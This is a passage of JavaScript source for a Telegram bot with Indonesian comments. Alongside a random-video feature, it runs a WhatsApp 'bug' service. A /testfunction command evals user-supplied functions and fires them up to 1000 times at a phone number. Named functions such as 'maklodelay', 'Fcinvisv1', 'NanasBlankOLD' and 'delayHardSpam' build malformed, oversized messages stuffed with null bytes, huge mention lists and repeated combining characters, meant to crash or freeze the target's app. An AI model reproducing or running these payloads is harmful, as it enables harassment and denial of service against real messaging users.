    await ctx.replyWithVideo(pick.url, {  // Langsung pass URL string, bukan object
      caption: '🎬 Video special untuk kamu!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    // Hapus pesan loading
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim video. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('video_next', async (ctx) => {
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  
  try {
    await ctx.answerCbQuery();
    
    // Kirim loading untuk next
    const loadingMsg = await ctx.reply('🔄 Loading video berikutnya...');
    
    await ctx.deleteMessage(); // Delete message lama
    
    const pick = getRandomVideo();
    await ctx.replyWithVideo(pick.url, {  // Direct URL
      caption: '🎬 Video berikutnya!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading video', { show_alert: true });
  }
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: bugurlpp },
        {
          caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : TESTI FUNCTION BUG 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : TESTI FUNCTION BUG 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: bugurlpp },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//FUNCTION BUG GB



//FUNCTION BUG NOMOR AMPAS LO TARO DISINI
async function maklodelay(sock, target) {
const x = "\u0000".repeat(9000);
const ryy = "999999999999";
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const xryy = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: x,
          name: x,
          publisher: x,
          fileLength: ryy,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          }
         }
        }
      }
    }
  };
  
  const xryyv2 = {
  groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "XRyyModeLawkaNnjr",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "1",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "2",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "request_call_message",
          paramsJson: "3",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "order_message",
          paramsJson: "4",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
            } 
          }
        }
      }
    }
  };

  await sock.relayMessage(target, xryy, {
    participant: { jid: target }
  });
    await sock.relayMessage(target, xryyv2, {
    participant: { jid: target }
  });
} 
} 

async function DelayNewByMia(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
           documentMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
             mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
             fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
             fileLength: "9999999999999",
             pageCount: 9999999999999,
             mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
             fileName: "CsmX.ppt",
             fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
             directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
             mediaKeyTimestamp: "1726867151",
             contactVcard: true,
             jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "i hope you in here, mia."
          },
          nativeFlowMessage: {
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "\u0000".repeat(950000)
            }]
          },
          contextInfo: {
            remoteJid: jid,
            participant: jid,
            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net" )],
            quotedMessage: {
             documentMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
               mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
               fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
               fileLength: "9999999999999",
               pageCount: 9999999999999,
               mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
               fileName: "CsmX.ppt",
               fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
               directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
               mediaKeyTimestamp: "1726867151",
               contactVcard: true,
               jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: jid }
  });
}

async function Fcinvisv1(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "DarkRelay Ampas",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});
    
    await sock.relayMessage(target, msg.message, {
  requestPaymentMessage: {
    currencyCodeIso4217: "IDR",
    amount1000: "9999",
    requestFrom: target,
    noteMessage: {
      extendedTextMessage: {
        text: msg, 
      }
    },
    expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
    amount: {
      value: 1000,
      offset: 1000,
      currencyCode: 'IDR'
    },
    background: {
      id: '1',
      color1: 0xff075e54,
      color2: 0xff128c7e,
      angle: 45
    },
    paymentStatus: 1,
    expiry: 86400,
    externalPaymentId: "123BCD",
    collectMessage: {
      text: "\u0000"
    },
    interstitial: {
      paymentMethod: true,
      installmentOptions: {
        maxInstallments: 999
      }
    }
  }
}, {
  participant: { jid: target }
});

    console.log(`🚀 DarkRelay Ampas${target}`);

  } catch (error) {
    console.error(`Error${error.message}`);
  }
}

async function NanasBlankOLD(sock, target) {
 try {
  const Nanas = 'ោ៝'.repeat(10000);
  const Muda = 'ꦾ'.repeat(10000);
  const Enaks = {
    newsletterAdminInviteMessage: {
    newsletterJid: "120363426778009391@newsletter",
    newsletterName: "DarkRelay" + "ោ៝".repeat(20000),
    caption: "Kingarmufa - Executed¿!" + Nanas + Muda + "ោ៝".repeat(75000),
    inviteExpiration: "90000",
    contextInfo: {
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await sock.relayMessage(target, Enaks, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug To ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}

async function kacunk(sock, target) {
  var msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "k",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function forceclosesw(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "DarkRelay Ampas",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

    console.log(`🚀 luncur ampas${target}`);

  } catch (error) {
    console.error(`Error${error.message}`);
  }
}

// delay hard invis no tag sw //
async function delayHardSpam(target) {
    let parse = true;

    for (let i = 0; i < 95; i++) {
        await sock.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " @TheWolKerz ",
                            format: 1
                        },
                        nativeFlowResponseMessage: {
                            name: "book_confirmation",
                            paramsJson: JSON.stringify({
                                status: "ok",
                                title: "𑇂𑆵𑆴𑆿".repeat(5000),
                                subtitle: " ".repeat(2000),
                                bookingInfo: "{".repeat(10000),
                                date: "WidsEverly" + "ោ៝".repeat(10000),
                                time: "WidsEverly" + "ោ៝".repeat(10000),
                                address: "WidsEverly" + "ꦾ".repeat(40000),
                                price: "WidsEverly" + "ꦾ".repeat(40000)
                            }),
                            version: 3
                        },
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            placeholder: Math.random().toString(36)
                        }
                    }
                }
            }
        }, 
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
    }
}

//


bot.launch()
